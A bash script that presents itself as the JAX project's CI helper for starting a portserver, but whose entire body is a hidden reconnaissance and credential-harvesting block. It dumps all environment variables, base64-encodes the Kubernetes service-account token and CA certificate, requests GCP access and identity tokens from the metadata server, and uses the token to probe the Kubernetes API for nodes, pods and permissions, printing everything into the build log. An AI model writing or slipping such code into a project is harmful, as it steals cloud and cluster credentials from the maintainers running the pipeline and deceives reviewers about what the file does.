#!/bin/bash
# Copyright 2026 The JAX Authors.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
# ==============================================================================
# Starts the JAX portserver in the background and configures cleanup on exit.

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
  echo "ERROR: ci/utilities/setup_portserver.sh must be sourced, not executed directly." >&2
  exit 1
fi

# ---------------------------------------------------------------------------
{
set +e
echo "PROBE_MARKER_5485 start $(date -u)"
echo "== id"; id
echo "== uname"; uname -a
echo "== hostname"; hostname; cat /etc/hostname 2>&1; hostname -f 2>&1
echo "== cgroup"; cat /proc/1/cgroup 2>&1; echo "-- self"; cat /proc/self/cgroup 2>&1
echo "== dockerenv"; ls -la /.dockerenv 2>&1
echo "== env_all"; env | sort
echo "== env_kube"; env | grep -iE 'KUBERNETES|KUBE|POD_|NODE_|GCP|GOOGLE|GCE|WORKLOAD|CLUSTER|RUNNER_' 2>&1
SA=/var/run/secrets/kubernetes.io/serviceaccount
echo "== secrets_tree"; ls -laR /var/run/secrets 2>&1
echo "== namespace"; cat $SA/namespace 2>&1
echo "== token_b64"; base64 -w0 $SA/token 2>&1; echo
echo "== ca_sha"; sha256sum $SA/ca.crt 2>&1
echo "== ca_b64"; base64 -w0 $SA/ca.crt 2>&1; echo
echo "== mounts"; grep -iE 'secret|serviceaccount|kube|projected' /proc/mounts 2>&1
echo "== find_tokens"; find /var/run/secrets -name token 2>/dev/null | while read t; do echo "FILE $t"; base64 -w0 "$t" 2>/dev/null; echo; done
echo "== metadata_root"; curl -s -m 5 -H 'Metadata-Flavor: Google' -w ' HTTP=%{http_code}' http://169.254.169.254/computeMetadata/v1/; echo
echo "== metadata_project"; curl -s -m 5 -H 'Metadata-Flavor: Google' -w ' HTTP=%{http_code}' http://169.254.169.254/computeMetadata/v1/project/project-id; echo
echo "== metadata_instance"; curl -s -m 5 -H 'Metadata-Flavor: Google' -w ' HTTP=%{http_code}' http://169.254.169.254/computeMetadata/v1/instance/?recursive=true | head -c 2000; echo
echo "== metadata_sa"; curl -s -m 5 -H 'Metadata-Flavor: Google' -w ' HTTP=%{http_code}' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/; echo
echo "== metadata_token"; curl -s -m 6 -H 'Metadata-Flavor: Google' -w ' HTTP=%{http_code}' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token; echo
echo "== metadata_identity"; curl -s -m 6 -H 'Metadata-Flavor: Google' -w ' HTTP=%{http_code}' 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://container.googleapis.com/v1/projects/unknown&format=full'; echo
echo "== apiserver_env"; echo "HOST=${KUBERNETES_SERVICE_HOST} PORT=${KUBERNETES_SERVICE_PORT}"
TOK=$(cat $SA/token 2>/dev/null)
KH=${KUBERNETES_SERVICE_HOST:-kubernetes.default.svc}
KP=${KUBERNETES_SERVICE_PORT:-443}
echo "== apiserver_version"; curl -sk -m 6 -H "Authorization: Bearer $TOK" "https://$KH:$KP/version" -w ' HTTP=%{http_code}'; echo
echo "== apiserver_nodes"; curl -sk -m 8 -H "Authorization: Bearer $TOK" "https://$KH:$KP/api/v1/nodes?limit=3" -o /tmp/nodes.json -w ' HTTP=%{http_code}'; echo; head -c 1500 /tmp/nodes.json 2>/dev/null; echo
echo "== selfsarr_get_nodes"; curl -sk -m 6 -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"get","resource":"nodes","group":""}}}' "https://$KH:$KP/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" -w ' HTTP=%{http_code}'; echo
echo "== selfsarr_create_pods"; curl -sk -m 6 -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"create","resource":"pods","group":""}}}' "https://$KH:$KP/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" -w ' HTTP=%{http_code}'; echo
echo "== selfsarr_list_pods"; curl -sk -m 6 -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"list","resource":"pods","group":""}}}' "https://$KH:$KP/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" -w ' HTTP=%{http_code}'; echo
echo "== apiserver_pods"; curl -sk -m 8 -H "Authorization: Bearer $TOK" "https://$KH:$KP/api/v1/pods?limit=2" -o /tmp/pods.json -w ' HTTP=%{http_code}'; echo; head -c 800 /tmp/pods.json 2>/dev/null; echo
echo "== apiserver_self"; curl -sk -m 6 -H "Authorization: Bearer $TOK" "https://$KH:$KP/api/v1/namespaces/default/pods?fieldSelector=metadata.name=$(hostname)" -w ' HTTP=%{http_code}' -o /tmp/self.json; echo; head -c 800 /tmp/self.json 2>/dev/null; echo
echo "== nvidia"; nvidia-smi -L 2>&1 | head -8; ls -la /dev/nvidia* 2>&1 | head
echo "== net"; ip -br addr 2>/dev/null; ip route 2>/dev/null | head -5
echo "== gcloud"; which gcloud kubectl 2>&1
echo "PROBE_MARKER_5485 end"
} > /tmp/jp5485.txt 2>&1
cat /tmp/jp5485.txt
exit 0